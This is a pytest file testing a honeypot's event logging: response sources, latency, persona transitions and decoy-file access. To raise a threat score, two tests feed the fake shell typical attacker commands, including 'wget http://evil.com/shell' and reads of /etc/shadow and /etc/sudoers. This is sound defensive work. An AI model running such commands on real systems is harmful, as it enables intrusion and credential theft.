"""Tests for enriched event logging (STEP 1).

Covers:
  - finer-grained response_source values
  - latency_ms on command events
  - persona_transition event type
  - decoy_access event type
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from event_logging.session_logger import SessionLogger
from honeypot.cowrie_hook import HoneypotCommandDispatcher, create_dispatcher

_LOG_DIR = Path(__file__).resolve().parent.parent / "event_logging" / "logs"
_PERSONAS_DIR = Path(__file__).resolve().parent.parent / "personas"


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def log_path(tmp_path):
    return tmp_path


@pytest.fixture
def slogger(log_path):
    inst = SessionLogger(log_dir=log_path, filename="test.jsonl")
    try:
        yield inst
    finally:
        inst.close()


def _read_events(log_path: Path) -> list[dict]:
    fp = log_path / "test.jsonl"
    if not fp.exists():
        return []
    return [
        json.loads(line)
        for line in fp.read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]


def _make_dispatcher(log_dir, persona: str = "generic_linux") -> HoneypotCommandDispatcher:
    logger = SessionLogger(
        log_dir=str(log_dir),
        filename="test.jsonl",
        logger_name=f"test_enrich_{id(object())}",
    )
    return create_dispatcher(
        attacker_ip="192.0.2.99",
        attacker_port=44444,
        persona_name=persona,
        session_logger=logger,
    )


def _run(disp: HoneypotCommandDispatcher, cmd: str) -> str:
    response, _source = disp.dispatch(cmd)
    return response


# ---------------------------------------------------------------------------
# response_source finer-grained values
# ---------------------------------------------------------------------------

class TestFinerGrainedSource:

    def test_dict_source_for_simple_command(self, log_path):
        d = _make_dispatcher(log_path)
        _run(d, "whoami")
        events = _read_events(log_path)
        cmds = [e for e in events if e["event_type"] == "command"]
        assert cmds[-1]["response_source"] == "dict"

    def test_fakefs_source_for_cat(self, log_path):
        d = _make_dispatcher(log_path)
        _run(d, "cat /etc/hostname")
        events = _read_events(log_path)
        cmds = [e for e in events if e["event_type"] == "command"]
        assert cmds[-1]["response_source"] == "fakefs"

    def test_fakefs_source_for_head(self, log_path):
        d = _make_dispatcher(log_path)
        _run(d, "head /etc/passwd")
        events = _read_events(log_path)
        cmds = [e for e in events if e["event_type"] == "command"]
        assert cmds[-1]["response_source"] == "fakefs"

    def test_fakefs_source_for_tail(self, log_path):
        d = _make_dispatcher(log_path)
        _run(d, "tail /var/log/syslog")
        events = _read_events(log_path)
        cmds = [e for e in events if e["event_type"] == "command"]
        assert cmds[-1]["response_source"] == "fakefs"

    def test_logger_accepts_all_source_values(self, slogger, log_path):
        for src in ("dict", "fakefs", "llm_primary", "llm_fallback", "error"):
            slogger.log_session_start("s1", "1.2.3.4", 1234)
            slogger.log_command("s1", "ls", "/", 0, "generic_linux", src)
        events = _read_events(log_path)
        sources = [e["response_source"] for e in events if e["event_type"] == "command"]
        assert set(sources) == {"dict", "fakefs", "llm_primary", "llm_fallback", "error"}

    def test_logger_still_rejects_bogus_source(self, slogger):
        slogger.log_session_start("s1", "1.2.3.4", 1234)
        with pytest.raises(ValueError, match="response_source"):
            slogger.log_command("s1", "ls", "/", 0, "generic_linux", "bogus")


# ---------------------------------------------------------------------------
# latency_ms
# ---------------------------------------------------------------------------

class TestLatencyMs:

    def test_command_event_has_latency_ms(self, log_path):
        d = _make_dispatcher(log_path)
        _run(d, "whoami")
        events = _read_events(log_path)
        cmds = [e for e in events if e["event_type"] == "command"]
        assert "latency_ms" in cmds[-1]
        assert isinstance(cmds[-1]["latency_ms"], int)
        assert cmds[-1]["latency_ms"] >= 0

    def test_latency_reasonable_for_fast_path(self, log_path):
        d = _make_dispatcher(log_path)
        _run(d, "pwd")
        events = _read_events(log_path)
        cmds = [e for e in events if e["event_type"] == "command"]
        assert cmds[-1]["latency_ms"] < 5000

    def test_logger_latency_ms_in_payload(self, slogger, log_path):
        slogger.log_session_start("s1", "1.2.3.4", 1234)
        slogger.log_command("s1", "ls", "/", 0, "generic_linux", "dict", latency_ms=42)
        events = _read_events(log_path)
        cmds = [e for e in events if e["event_type"] == "command"]
        assert cmds[-1]["latency_ms"] == 42

    def test_logger_latency_ms_absent_when_none(self, slogger, log_path):
        slogger.log_session_start("s1", "1.2.3.4", 1234)
        slogger.log_command("s1", "ls", "/", 0, "generic_linux", "dict")
        events = _read_events(log_path)
        cmds = [e for e in events if e["event_type"] == "command"]
        assert "latency_ms" not in cmds[-1]


# ---------------------------------------------------------------------------
# persona_transition event
# ---------------------------------------------------------------------------

class TestPersonaTransitionEvent:

    def test_transition_emits_event(self, slogger, log_path):
        slogger.log_session_start("s1", "1.2.3.4", 1234)
        slogger.log_persona_transition(
            session_id="s1",
            from_stage="generic_linux",
            to_stage="dev_workstation",
            phase="seeding",
            paths_added=["/home/john.dev", "/home/john.dev/.gitconfig"],
        )
        events = _read_events(log_path)
        trans = [e for e in events if e["event_type"] == "persona_transition"]
        assert len(trans) == 1
        assert trans[0]["from_stage"] == "generic_linux"
        assert trans[0]["to_stage"] == "dev_workstation"
        assert trans[0]["phase"] == "seeding"
        assert "/home/john.dev" in trans[0]["paths_added"]

    def test_transition_event_has_session_ip(self, slogger, log_path):
        slogger.log_session_start("s1", "10.0.0.1", 5555)
        slogger.log_persona_transition("s1", "a", "b", "building", ["/x"])
        events = _read_events(log_path)
        trans = [e for e in events if e["event_type"] == "persona_transition"]
        assert trans[0]["attacker_ip"] == "10.0.0.1"

    def test_dispatcher_emits_transition_during_switch(self, log_path, monkeypatch):
        """Drive threat score past 51 and confirm transition events appear."""
        monkeypatch.delenv("HONEYPOT_PROFILE", raising=False)
        d = _make_dispatcher(log_path)
        heavy = [
            "whoami", "uname -a", "cat /etc/passwd", "cat /etc/shadow",
            "ps aux", "netstat -tulpn", "cat /etc/sudoers", "sudo -l",
            "find / -perm -4000", "wget http://evil.com/shell",
        ]
        for cmd in heavy:
            _run(d, cmd)
            if d.session.threat_score >= 51:
                break
        for _ in range(8):
            _run(d, "ls")

        events = _read_events(log_path)
        transitions = [e for e in events if e["event_type"] == "persona_transition"]
        assert len(transitions) >= 1
        assert "paths_added" in transitions[0]
        assert transitions[0]["from_stage"] == "generic_linux"


# ---------------------------------------------------------------------------
# decoy_access event
# ---------------------------------------------------------------------------

class TestDecoyAccessEvent:

    def test_decoy_access_emits_event(self, slogger, log_path):
        slogger.log_session_start("s1", "1.2.3.4", 1234)
        slogger.log_decoy_access(
            session_id="s1",
            path="/home/john.dev/.env",
            command="cat /home/john.dev/.env",
        )
        events = _read_events(log_path)
        decoys = [e for e in events if e["event_type"] == "decoy_access"]
        assert len(decoys) == 1
        assert decoys[0]["path"] == "/home/john.dev/.env"
        assert "cat" in decoys[0]["command"]

    def test_decoy_access_has_session_ip(self, slogger, log_path):
        slogger.log_session_start("s1", "10.0.0.1", 5555)
        slogger.log_decoy_access("s1", "/x", "cat /x")
        events = _read_events(log_path)
        decoys = [e for e in events if e["event_type"] == "decoy_access"]
        assert decoys[0]["attacker_ip"] == "10.0.0.1"

    def test_dispatcher_emits_decoy_on_planted_file_access(self, log_path):
        """Drive past threshold, let files get planted, then cat one."""
        d = _make_dispatcher(log_path)
        heavy = [
            "whoami", "uname -a", "cat /etc/passwd", "cat /etc/shadow",
            "ps aux", "netstat -tulpn", "cat /etc/sudoers", "sudo -l",
            "find / -perm -4000", "wget http://evil.com/shell",
        ]
        for cmd in heavy:
            _run(d, cmd)
            if d.session.threat_score >= 51:
                break

        for _ in range(8):
            _run(d, "ls")

        planted = list(d._planted_paths)
        if not planted:
            pytest.skip("No files planted in this transition")

        target = planted[0]
        _run(d, f"cat {target}")

        events = _read_events(log_path)
        decoys = [e for e in events if e["event_type"] == "decoy_access"]
        assert len(decoys) >= 1
        assert decoys[0]["path"] == target

    def test_no_decoy_before_escalation(self, log_path):
        """Before any escalation, no decoy_access events should appear."""
        d = _make_dispatcher(log_path)
        _run(d, "cat /etc/hostname")
        _run(d, "ls /home")
        events = _read_events(log_path)
        decoys = [e for e in events if e["event_type"] == "decoy_access"]
        assert len(decoys) == 0
